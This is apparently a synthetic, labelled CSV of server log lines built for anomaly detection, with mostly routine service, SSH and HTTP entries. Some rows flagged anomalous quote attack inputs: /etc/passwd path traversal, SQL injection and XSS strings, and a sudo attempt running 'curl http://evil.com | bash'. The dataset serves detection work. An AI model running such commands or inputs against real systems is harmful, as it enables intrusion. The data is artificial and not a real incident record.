timestamp,log_message,label,anomaly_type
2026-01-04 10:15:05,session opened for user nginx by (uid=0),0,normal
2026-01-04 10:15:09,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 10:15:11,session opened for user www-data by (uid=0),0,normal
2026-01-04 10:15:12,"192.168.80.111 - - [03/Jan/2026:20:04:35 +0700] ""GET /api/v1/data HTTP/1.1"" 200 34915",0,normal
2026-01-04 10:15:17,"192.42.133.201 - - [04/Jan/2026:10:24:00 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 28642",1,suspicious_network
2026-01-04 10:15:19,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:15:23,[INFO] Cache hit for key: cache_key_527,0,normal
2026-01-04 10:15:41,"192.168.234.207 - - [03/Jan/2026:17:42:24 +0700] ""GET /dashboard HTTP/1.1"" 200 25867",0,normal
2026-01-04 10:15:46,Accepted password for admin from 192.168.50.220 port 23712 ssh2,0,normal
2026-01-04 10:15:56,[INFO] Request processed in 2009ms,0,normal
2026-01-04 10:15:56,"192.168.43.31 - - [03/Jan/2026:15:49:02 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 10:15:57,Connection received: host=192.168.48.207 user=www-data database=production,0,normal
2026-01-04 10:16:00,[INFO] Cache hit for key: cache_key_292,0,normal
2026-01-04 10:16:04,[INFO] Cache hit for key: cache_key_36,0,normal
2026-01-04 10:16:11,MySQL server started with process id 25262,0,normal
2026-01-04 10:16:15,Possible SQL injection attack from 45.33.152.124: <script>alert('xss')</script>,1,suspicious_network
2026-01-04 10:16:19,session opened for user postgres by (uid=0),0,normal
2026-01-04 10:16:20,[INFO] Application started successfully,0,normal
2026-01-04 10:16:21,[INFO] Request processed in 1425ms,0,normal
2026-01-04 10:16:35,[INFO] Cache hit for key: cache_key_908,0,normal
2026-01-04 10:16:51,systemd[1]: Started ssh.service,0,normal
2026-01-04 10:16:59,"192.168.153.207 - - [03/Jan/2026:16:03:20 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 10:17:03,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 10:17:05,ALERT: Rootkit signature detected in /index.html,1,malware_indicator
2026-01-04 10:17:18,"192.168.75.165 - - [04/Jan/2026:01:29:40 +0700] ""GET /login HTTP/1.1"" 200 48403",0,normal
2026-01-04 10:17:30,su: FAILED SU (to root) guest on pts/0,1,privilege_escalation
2026-01-04 10:17:40,systemd[1]: Started ssh.service,0,normal
2026-01-04 10:17:51,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 10:17:52,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 10:18:01,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 10:18:06,"192.168.242.204 - - [04/Jan/2026:02:37:07 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 10:18:54,ALERT: Rootkit signature detected in /css/style.css,1,malware_indicator
2026-01-04 10:19:01,"kernel: [854.382750] I/O error, dev eth1, sector 6813805",1,system_error
2026-01-04 10:19:02,Accepted password for admin from 192.168.46.54 port 56385 ssh2,0,normal
2026-01-04 10:19:02,[INFO] Application started successfully,0,normal
2026-01-04 10:19:03,"192.168.169.246 - - [03/Jan/2026:17:39:52 +0700] ""GET /api/v1/users HTTP/1.1"" 200 43202",0,normal
2026-01-04 10:19:15,Received disconnect from 192.168.125.48 port 24427:11: disconnected by user,0,normal
2026-01-04 10:19:39,session opened for user postgres by (uid=0),0,normal
2026-01-04 10:19:47,[INFO] Application started successfully,0,normal
2026-01-04 10:19:49,systemd[1]: Starting redis.service...,0,normal
2026-01-04 10:19:51,"192.168.104.175 - - [04/Jan/2026:11:52:12 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 10:20:05,"45.33.253.23 - - [04/Jan/2026:07:41:17 +0700] ""POST /login HTTP/1.1"" 401 127",1,suspicious_network
2026-01-04 10:20:08,systemd[1]: Started cron.service,0,normal
2026-01-04 10:20:11,Accepted password for apache from 192.168.53.4 port 37042 ssh2,0,normal
2026-01-04 10:20:27,"192.168.188.29 - - [04/Jan/2026:04:27:06 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 39788",0,normal
2026-01-04 10:20:40,MySQL server started with process id 2267,0,normal
2026-01-04 10:20:44,"192.168.227.166 - - [03/Jan/2026:14:46:12 +0700] ""POST /login HTTP/1.1"" 200 38872",0,normal
2026-01-04 10:20:49,session opened for user postgres by (uid=0),0,normal
2026-01-04 10:21:01,systemd[1]: Starting docker.service...,0,normal
2026-01-04 10:21:09,Accepted password for www-data from 192.168.163.159 port 58609 ssh2,0,normal
2026-01-04 10:21:11,Received disconnect from 192.168.251.71 port 32654:11: disconnected by user,0,normal
2026-01-04 10:21:20,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 10:21:30,Accepted password for nginx from 192.168.8.24 port 6799 ssh2,0,normal
2026-01-04 10:21:31,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:21:42,sudo: apache : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=curl http://evil.com | bash,1,privilege_escalation
2026-01-04 10:21:43,[INFO] Cache hit for key: cache_key_940,0,normal
2026-01-04 10:21:51,MySQL server started with process id 29268,0,normal
2026-01-04 10:21:59,"192.168.89.59 - - [03/Jan/2026:14:56:00 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 31611",0,normal
2026-01-04 10:22:06,[DEBUG] Processing request from 192.168.134.107,0,normal
2026-01-04 10:22:08,"192.168.103.127 - - [04/Jan/2026:13:30:00 +0700] ""GET /api/v1/data HTTP/1.1"" 200 44138",0,normal
2026-01-04 10:22:11,error: maximum authentication attempts exceeded for www-data from 104.248.199.79,1,brute_force
2026-01-04 10:22:12,session closed for user www-data,0,normal
2026-01-04 10:22:14,kernel: [979.253491] wlan0: link up,0,normal
2026-01-04 10:22:19,kernel: [397.470390] eth1: link up,0,normal
2026-01-04 10:22:26,Connection received: host=192.168.47.241 user=admin database=test,0,normal
2026-01-04 10:22:40,kernel: [171.835593] eth0: link up,0,normal
2026-01-04 10:22:42,Connection received: host=192.168.92.245 user=nginx database=staging,0,normal
2026-01-04 10:22:45,systemd[1]: Started redis.service,0,normal
2026-01-04 10:23:04,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 10:23:09,Received disconnect from 192.168.169.109 port 17663:11: disconnected by user,0,normal
2026-01-04 10:23:16,"192.168.162.6 - - [03/Jan/2026:15:08:22 +0700] ""POST /login HTTP/1.1"" 200 14276",0,normal
2026-01-04 10:23:19,[INFO] Application started successfully,0,normal
2026-01-04 10:23:31,Accepted password for postgres from 192.168.1.98 port 4076 ssh2,0,normal
2026-01-04 10:23:34,[INFO] User apache logged in successfully,0,normal
2026-01-04 10:23:36,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 10:23:46,session closed for user postgres,0,normal
2026-01-04 10:24:01,"192.42.5.42 - - [04/Jan/2026:00:05:47 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 19779",1,suspicious_network
2026-01-04 10:24:08,kernel: [316.132687] br-0: link up,0,normal
2026-01-04 10:24:16,[DEBUG] Processing request from 192.168.244.249,0,normal
2026-01-04 10:24:16,kernel: [476.896365] eth0: link down,0,normal
2026-01-04 10:24:35,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:25:01,Received disconnect from 192.168.184.53 port 28619:11: disconnected by user,0,normal
2026-01-04 10:25:07,kernel: [702.761920] wlan0: link down,0,normal
2026-01-04 10:25:16,kernel: Out of memory: Kill process 38469 (cryptominer) score 497,1,system_error
2026-01-04 10:25:17,Received disconnect from 192.168.53.126 port 16314:11: disconnected by user,0,normal
2026-01-04 10:25:28,[INFO] User user logged in successfully,0,normal
2026-01-04 10:25:46,"192.168.54.170 - - [03/Jan/2026:20:20:47 +0700] ""POST / HTTP/1.1"" 200 39211",0,normal
2026-01-04 10:26:03,kernel: [344.884464] wlan0: link down,0,normal
2026-01-04 10:26:09,MySQL server started with process id 48843,0,normal
2026-01-04 10:26:29,"192.168.69.174 - - [04/Jan/2026:12:18:04 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 10:26:30,Connection received: host=192.168.44.165 user=admin database=analytics,0,normal
2026-01-04 10:26:41,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 10:26:45,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:26:46,Connection received: host=192.168.69.113 user=root database=analytics,0,normal
2026-01-04 10:26:47,kernel: [340.303636] eth1: link down,0,normal
2026-01-04 10:26:50,WARNING: Unauthorized file modification: /,1,malware_indicator
2026-01-04 10:26:50,[DEBUG] Processing request from 192.168.36.57,0,normal
2026-01-04 10:27:10,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 10:27:10,session opened for user admin by (uid=0),0,normal
2026-01-04 10:27:15,session opened for user root by (uid=0),0,normal
2026-01-04 10:27:27,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 10:28:01,"192.168.65.229 - - [04/Jan/2026:13:25:45 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 10:28:06,systemd[1]: Starting cron.service...,0,normal
2026-01-04 10:28:08,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 10:28:18,systemd[1]: Starting cron.service...,0,normal
2026-01-04 10:28:36,"192.168.248.50 - - [03/Jan/2026:15:35:58 +0700] ""POST /api/v1/data HTTP/1.1"" 200 15089",0,normal
2026-01-04 10:28:57,kernel: [776.829671] eth0: link down,0,normal
2026-01-04 10:29:03,[INFO] Application started successfully,0,normal
2026-01-04 10:29:10,ALERT: Rootkit signature detected in /static/js/app.js,1,malware_indicator
2026-01-04 10:29:13,kernel: [425.760356] eth0: link up,0,normal
2026-01-04 10:29:16,session closed for user www-data,0,normal
2026-01-04 10:29:22,Accepted password for mysql from 192.168.103.95 port 19039 ssh2,0,normal
2026-01-04 10:29:40,session closed for user nginx,0,normal
2026-01-04 10:29:44,DDoS attack detected from 104.248.229.119 - rate limit exceeded,1,suspicious_network
2026-01-04 10:29:49,[INFO] Application started successfully,0,normal
2026-01-04 10:29:52,Possible SQL injection attack from 185.220.64.195: ' OR '1'='1,1,suspicious_network
2026-01-04 10:30:07,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:30:13,"192.168.44.202 - - [04/Jan/2026:06:21:09 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 10:30:21,DDoS attack detected from 192.42.32.156 - rate limit exceeded,1,suspicious_network
2026-01-04 10:30:26,[INFO] Request processed in 899ms,0,normal
2026-01-04 10:30:54,"192.168.99.254 - - [03/Jan/2026:16:40:48 +0700] ""POST /images/logo.png HTTP/1.1"" 200 37555",0,normal
2026-01-04 10:30:58,[DEBUG] Processing request from 192.168.111.142,0,normal
2026-01-04 10:31:02,MySQL server started with process id 56262,0,normal
2026-01-04 10:31:05,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:31:05,"192.168.126.76 - - [04/Jan/2026:08:57:12 +0700] ""GET /api/v1/users HTTP/1.1"" 200 4034",0,normal
2026-01-04 10:31:06,PAM: Authentication failure for admin from 104.248.12.35,1,brute_force
2026-01-04 10:31:26,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:31:31,WARNING: Cryptominer activity detected on process 26251,1,malware_indicator
2026-01-04 10:31:36,"192.168.209.245 - - [03/Jan/2026:19:05:25 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 10:31:40,"192.168.144.9 - - [03/Jan/2026:22:52:50 +0700] ""GET / HTTP/1.1"" 200 36541",0,normal
2026-01-04 10:31:48,"192.168.106.75 - - [03/Jan/2026:20:11:26 +0700] ""POST /login HTTP/1.1"" 200 12763",0,normal
2026-01-04 10:31:49,www-data: user NOT in sudoers; TTY=pts/0; PWD=/home/www-data; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 10:32:02,session closed for user mysql,0,normal
2026-01-04 10:32:25,Received disconnect from 192.168.72.208 port 13053:11: disconnected by user,0,normal
2026-01-04 10:32:40,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 10:32:40,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 10:32:42,[INFO] User nginx logged in successfully,0,normal
2026-01-04 10:32:42,systemd[1]: Started apache2.service,0,normal
2026-01-04 10:32:44,"185.220.137.101 - - [04/Jan/2026:05:26:15 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 11313",1,suspicious_network
2026-01-04 10:33:01,[ERROR] Disk space critical: /tmp at 93% usage,1,system_error
2026-01-04 10:33:23,kernel: [112.481632] wlan0: link up,0,normal
2026-01-04 10:33:29,[DEBUG] Processing request from 192.168.108.135,0,normal
2026-01-04 10:34:00,Accepted password for apache from 192.168.93.33 port 2050 ssh2,0,normal
2026-01-04 10:34:34,[INFO] Request processed in 4578ms,0,normal
2026-01-04 10:34:35,kernel: [302.275914] br-0: link down,0,normal
2026-01-04 10:34:35,"185.220.15.148 - - [04/Jan/2026:09:44:18 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 7505",1,suspicious_network
2026-01-04 10:34:38,session opened for user root by (uid=0),0,normal
2026-01-04 10:34:48,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:34:58,[INFO] Request processed in 3893ms,0,normal
2026-01-04 10:35:18,systemd[1]: Stopped mysql.service,0,normal
2026-01-04 10:35:30,Accepted password for apache from 192.168.39.136 port 42037 ssh2,0,normal
2026-01-04 10:35:30,"192.168.192.134 - - [03/Jan/2026:20:45:52 +0700] ""POST /api/v1/data HTTP/1.1"" 200 26412",0,normal
2026-01-04 10:35:37,Accepted password for user from 192.168.168.253 port 62008 ssh2,0,normal
2026-01-04 10:35:39,"192.168.239.148 - - [04/Jan/2026:05:23:26 +0700] ""POST /css/style.css HTTP/1.1"" 200 47118",0,normal
2026-01-04 10:35:51,[INFO] User root logged in successfully,0,normal
2026-01-04 10:35:52,Connection received: host=192.168.196.30 user=postgres database=production,0,normal
2026-01-04 10:35:58,"192.168.151.67 - - [03/Jan/2026:20:29:33 +0700] ""POST /index.html HTTP/1.1"" 200 8234",0,normal
2026-01-04 10:36:01,Connection received: host=192.168.80.55 user=www-data database=users,0,normal
2026-01-04 10:36:04,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 10:36:12,session opened for user user by (uid=0),0,normal
2026-01-04 10:36:15,ALERT: Suspicious process detected: keylogger (PID: 2408),1,malware_indicator
2026-01-04 10:36:16,[INFO] Cache hit for key: cache_key_2,0,normal
2026-01-04 10:36:17,MySQL server started with process id 14971,0,normal
2026-01-04 10:36:38,[INFO] Cache hit for key: cache_key_508,0,normal
2026-01-04 10:36:59,session closed for user admin,0,normal
2026-01-04 10:37:02,[INFO] Cache hit for key: cache_key_524,0,normal
2026-01-04 10:37:10,systemd[1]: Started ssh.service,0,normal
2026-01-04 10:37:12,[INFO] Application started successfully,0,normal
2026-01-04 10:37:18,Accepted password for nginx from 192.168.172.161 port 12563 ssh2,0,normal
2026-01-04 10:37:22,[INFO] Request processed in 2034ms,0,normal
2026-01-04 10:37:46,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 10:37:50,Received disconnect from 192.168.142.165 port 6996:11: disconnected by user,0,normal
2026-01-04 10:38:13,kernel: [61.970150] docker0: link down,0,normal
2026-01-04 10:38:32,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:38:32,Accepted password for mysql from 192.168.111.223 port 30341 ssh2,0,normal
2026-01-04 10:38:34,session opened for user mysql by (uid=0),0,normal
2026-01-04 10:38:40,"192.168.143.155 - - [04/Jan/2026:07:36:37 +0700] ""POST /css/style.css HTTP/1.1"" 200 28642",0,normal
2026-01-04 10:38:58,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:39:15,"192.168.175.121 - - [03/Jan/2026:23:39:08 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 10:39:20,session opened for user admin by (uid=0),0,normal
2026-01-04 10:39:27,[INFO] Cache hit for key: cache_key_443,0,normal
2026-01-04 10:39:30,[DEBUG] Processing request from 192.168.135.219,0,normal
2026-01-04 10:39:51,kernel: Out of memory: Kill process 64982 (cryptominer) score 656,1,system_error
2026-01-04 10:40:27,Received disconnect from 192.168.90.82 port 44135:11: disconnected by user,0,normal
2026-01-04 10:40:28,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 10:40:32,[INFO] Application started successfully,0,normal
2026-01-04 10:40:41,session closed for user mysql,0,normal
2026-01-04 10:40:43,MySQL server started with process id 3363,0,normal
2026-01-04 10:41:21,[INFO] Application started successfully,0,normal
2026-01-04 10:41:46,session closed for user nginx,0,normal
2026-01-04 10:41:50,session opened for user admin by (uid=0),0,normal
2026-01-04 10:42:04,kernel: [69.798646] br-0: link up,0,normal
2026-01-04 10:42:09,Received disconnect from 192.168.42.125 port 20244:11: disconnected by user,0,normal
2026-01-04 10:42:17,[INFO] Application started successfully,0,normal
2026-01-04 10:42:18,"192.168.154.54 - - [04/Jan/2026:11:31:42 +0700] ""POST / HTTP/1.1"" 200 1038",0,normal
2026-01-04 10:42:23,Accepted password for mysql from 192.168.174.167 port 28936 ssh2,0,normal
2026-01-04 10:42:37,kernel: [934.466317] wlan0: link up,0,normal
2026-01-04 10:42:39,[DEBUG] Processing request from 192.168.219.77,0,normal
2026-01-04 10:42:40,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 10:42:41,[INFO] Request processed in 4516ms,0,normal
2026-01-04 10:42:41,ALERT: Suspicious process detected: ransomware (PID: 44997),1,malware_indicator
2026-01-04 10:42:44,kernel: [710.486274] docker0: link down,0,normal
2026-01-04 10:42:45,"192.168.153.3 - - [04/Jan/2026:13:52:41 +0700] ""GET /css/style.css HTTP/1.1"" 200 25948",0,normal
2026-01-04 10:42:49,ALERT: Unauthorized privilege escalation attempt by www-data,1,privilege_escalation
2026-01-04 10:42:50,"192.168.23.51 - - [04/Jan/2026:06:58:35 +0700] ""GET /images/logo.png HTTP/1.1"" 200 23853",0,normal
2026-01-04 10:42:53,[INFO] Request processed in 4726ms,0,normal
2026-01-04 10:42:53,systemd[1]: Starting mysql.service...,0,normal
